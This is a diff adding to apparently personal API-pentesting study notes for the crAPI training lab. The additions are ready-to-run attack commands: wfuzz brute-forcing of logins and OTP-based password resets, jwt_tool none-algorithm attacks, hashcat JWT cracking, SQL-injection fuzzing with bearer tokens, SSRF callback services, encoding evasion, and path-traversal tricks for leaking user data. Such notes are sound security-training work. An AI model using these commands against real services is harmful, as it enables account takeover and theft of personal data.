@@ -261,6 +261,12 @@ RECON:
 
 [+] use github search
 
+[+] mitmweb
+
+- open on 127.0.0.1:8081
+
+[Reverse engineer with mitmweb]
+
 [+] mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yml -p [http://crapi.apisec.ai](http://crapi.apisec.ai/) -e -f har --examples
 
 - sudo mitmproxy2swagger -i flows -o spec.yml -p [http://crapi.apisec.ai](http://crapi.apisec.ai/) -f flow --examples
@@ -269,6 +275,90 @@ RECON:
 
 [create rogue API endpoint with dev tool OR mitmweb]
 
+[+] Bruteforce json using wfuzz 
+
+- wfuzz -d '{"[email":"testninja@gmail.com](mailto:email%22:%22testninja@gmail.com)","password":"Test@test"}' -H 'Content-type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://crapi.apisec.ai/login/identity/api/auth/login --hc 500
+
+#JWT_TOOL: (BOLA/BFLA)
+
+[+] jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZXN0bmluamFAZ21haWwuY29tIiwiaWF0IjoxNzQ0MjMyNTE3LCJleHAiOjE3NDQzMTg5MTd9.FhmjqYaVEB0BeWwJxNTxu61u6GfWzzcub1t7wT5yCiiTKhCbcvyjZcXowGAN_eXyfc4ZjOOXt3OSPf6osWE0hA
+
+[check jwt]
+
+[+] jwt_tool -t http://crapi.apisec.ai/identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZXN0bmluamFAZ21haWwuY29tIiwiaWF0IjoxNzQ0MjMyNTE3LCJleHAiOjE3NDQzMTg5MTd9.FhmjqYaVEB0BeWwJxNTxu61u6GfWzzcub1t7wT5yCiiTKhCbcvyjZcXowGAN_eXyfc4ZjOOXt3OSPf6osWE0hA" -M pb
+
+[scan url with jwt]
+
+[+] jwt_tool <token> -X a
+
+[algorithm none attack]
+
+[+] JWT cracking with crunch
+
+- crunch 5 5 -o crAPI.txt
+- jwt_tool <token> -C -d <crunch-wordlist-path>
+
+#Improper Assets Management
+
+[+] Group all API version you want to work with in a collection
+
+- go to find and replace and select the collection with the name of the version (v1 OR v2)
+- set environmental variable {{ver}} and set API version name you want to work with in the value and current value.
+- set {{ver}} “replace with” in find and replace and “select all”
+- Find and Replace also for v3 version and leave the environmental variable value as v1 to test
+- Test as unauthenticated and non-authenticated user and view all runs once test is done
+
+[+] wfuzz -d '{"[email":"testninja@gmail.com](mailto:email%22:%22testninja@gmail.com)", "otp”:"FUZZ", "password":"Newpassword1"}' -H 'Content-type: application/json' -z file,/usr/share/wordlists/SecLists/Fuzzing/4-digits-0000-9999.txt  -u [http://crapi.apisec.ai/identity/api/auth/v2/check-otp](http://crapi.apisec.ai/login/identity/api/auth/v2/check-otp) --hc 500
+
+[Fuzz OTP and change password with wfuzz]
+
+#Mass Assignment
+
+[+] Check for parameters to pass requests using param miner
+
+[+] Try changing the CRUD functionality to do something unusual on the server. Like add product to a shop or add money to your account using a negative balance maunipulation.
+
+#SSRF
+
+[+] ifconfig.pro
+
+- webhook.site
+- pingb.in
+- requestbin.com
+- canarytokens.org
+
+[SSRF testing site]
+
+[+] Target full URLs in POST body or parameter
+
+- URL paths (or partial URLs) in the POST body or parameters
+- Headers that include URLs like Referrer
+- Allows for user that may result in a server retrieving resources
+
+[+] In In-Band SSRF the content of the URL supplied is displayed back in a response
+
+#Injection Vulnerability
+
+[+] You can test by adding {{fuzz}} parameter to the endpoints or input and “fuzz” with payload as value to the environmental variable
+
+[+] You can also fuzz parameters with intruder or wfuzz
+
+[+] fuzzing for sql injection using wfuzz
+
+- wfuzz -w /usr/share/wordlists/sqlmap.txt -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZXN0bmluamExQGdtYWlsLmNvbSIsImlhdCI6MTc0NDczNTY4MywiZXhwIjoxNzQ0ODIyMDgzfQ.lsSTpSWeWrTbiO2xm_D6a-bZ7wqdGLbpONh3XnKxGk1AZDcoaZeh9k5u_H-Ib5nfUNCDq8bQXkU0erKiDLa1XQ" -d '{\"coupon_code\":"FUZZ"}' --sc 200 http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
+- you can proxy request to burp using -p localhost:8080
+
+#Evasion
+
+[+] Case switching, Encoding, Null bytes
+
+[+] use wfuzz to encode
+
+- <wfuzz -e encoders> this will show the lists of encoding option available in wfuzz
+- wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
+- wfuzz -z list,TEST,base64-md5-none
+- 
+
 ---
 
 # TRICKS
@@ -276,6 +366,20 @@ RECON:
 [+] mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yaml -p [http://crapi.apisec.ai](http://crapi.apisec.ai/) -e -f har
 
 [create rogue API endpoint]
+
+[+] : If you playing with `API ENDPOINT` always try to send `INVALID CONTENT TYPE` end-up by getting hidden endpoints in `RESPONSE` 
+
+[+] Leak PII sensitive API Users DATA with URL Path Permutations: /api/users/user@email.com -> /api/users/..%2Fuser@email.com or /api/account/123/ -> /api/account/..%2F..%2F123
+
+[+] Crack JWT token. Save the JWT in file called hash 
+
+- hashcat -a 0 -m 16500 hash /usr/share/wordlists/rockyou.txt
+
+[+] curl blablah -d | jq
+
+[Beautiful JSON]
+
+[+] Bypassed coupon code API Endpoint using dilema [ 2,2,2 or 2;2;2 or 222
 
 ---
 
